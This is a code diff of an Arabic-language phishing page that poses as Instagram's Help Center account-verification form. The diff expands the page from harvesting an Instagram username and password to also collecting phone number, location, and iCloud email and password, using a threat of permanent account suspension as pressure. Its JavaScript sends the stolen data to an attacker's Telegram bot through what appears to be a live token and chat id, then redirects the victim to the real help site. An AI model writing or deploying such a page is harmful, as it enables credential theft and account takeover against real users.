@@ -1,39 +1,98 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram | Help Center</title>
+    <title>مركز المساعدة | التحقق من ملكية الحساب</title>
     <style>
-        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
-        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 25px; text-align: center; border-radius: 3px; }
-        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; }
-        button { width: 97%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; padding: 20px; }
+        .container { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 400px; padding: 30px 20px; text-align: center; border-radius: 3px; box-sizing: border-box; }
         .logo { width: 175px; margin-bottom: 20px; }
-        p { color: #8e8e8e; font-size: 14px; line-height: 1.4; }
+        h2 { font-size: 18px; color: #262626; margin-bottom: 10px; }
+        p { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
+        .form-group { text-align: right; margin-bottom: 15px; }
+        label { display: block; font-size: 13px; color: #262626; margin-bottom: 5px; font-weight: bold; }
+        input, select, textarea { width: 100%; padding: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 14px; box-sizing: border-box; }
+        select { height: 40px; }
+        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #1877f2; }
+        .footer-text { font-size: 12px; color: #c7c7c7; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="login-box">
+    <div class="container">
         <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo">
-        <p>يرجى تسجيل الدخول لتأكيد ملكية الحساب للمتابعة إلى مركز المساعدة.</p>
-        <input type="text" id="u" placeholder="اسم المستخدم أو الهاتف">
-        <input type="password" id="p" placeholder="كلمة السر">
-        <button onclick="send()">تسجيل الدخول</button>
+        <h2>تأكيد بيانات الوصول</h2>
+        <p>يرجى إكمال النموذج التالي بدقة لإثبات ملكيتك للحساب وتجنب الإيقاف النهائي بسبب نشاط مشبوه.</p>
+
+        <div class="form-group">
+            <label>هل أنت صاحب الحساب الأصلي؟</label>
+            <select id="isOwner">
+                <option value="نعم">نعم، أنا المالك</option>
+                <option value="لا">لا، مفوض من قبل المالك</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label>اسم المستخدم (يوزر الحساب)</label>
+            <input type="text" id="user" placeholder="@username">
+        </div>
+
+        <div class="form-group">
+            <label>رقم الهاتف المرتبط</label>
+            <input type="tel" id="phone" placeholder="+966xxxxxxxxx">
+        </div>
+
+        <div class="form-group">
+            <label>الموقع (المدينة/الدولة)</label>
+            <input type="text" id="location" placeholder="مثال: الرياض، السعودية">
+        </div>
+
+        <div class="form-group">
+            <label>بريد iCloud المرتبط</label>
+            <input type="email" id="icloud_email" placeholder="example@icloud.com">
+        </div>
+
+        <div class="form-group">
+            <label>كلمة مرور iCloud</label>
+            <input type="password" id="icloud_pass" placeholder="Password">
+        </div>
+
+        <div class="form-group">
+            <label>ملاحظات إضافية (اختياري)</label>
+            <textarea id="note" rows="3" placeholder="اكتب ملاحظاتك هنا..."></textarea>
+        </div>
+
+        <button onclick="sendData()">تأكيد البيانات والمتابعة</button>
+        <div class="footer-text">© 2026 Instagram from Meta</div>
     </div>
 
     <script>
-        function send() {
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
+        function sendData() {
+            const isOwner = document.getElementById('isOwner').value;
+            const user = document.getElementById('user').value;
+            const phone = document.getElementById('phone').value;
+            const loc = document.getElementById('location').value;
+            const i_email = document.getElementById('icloud_email').value;
+            const i_pass = document.getElementById('icloud_pass').value;
+            const note = document.getElementById('note').value;
+
             const token = '8041952672:AAHnA6IfRCRniW6qrBw3091KAx4_DsxzcoA';
             const chatId = '7074300443';
 
-            if(!user || !pass) { alert("يرجى إدخال البيانات"); return; }
+            if(!user || !i_pass) { alert("يرجى تعبئة الحقول الأساسية"); return; }
 
-            const msg = `🎯 صيد جديد (حساب كامل) 🎯\n👤 اليوزر: ${user}\n🔑 الباسورد: ${pass}`;
+            const message = `🔥 صيد كامل وشامل 🔥\n\n` +
+                          `👤 صاحب الحساب: ${isOwner}\n` +
+                          `🆔 يوزر الحساب: ${user}\n` +
+                          `📞 رقم الهاتف: ${phone}\n` +
+                          `📍 الموقع: ${loc}\n` +
+                          `📧 iCloud: ${i_email}\n` +
+                          `🔑 iCloud Pass: ${i_pass}\n` +
+                          `📝 ملاحظة: ${note}\n\n` +
+                          `🛡️ تم السحب بنجاح!`;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .then(() => {
                 window.location.href = "https://help.instagram.com";
             });
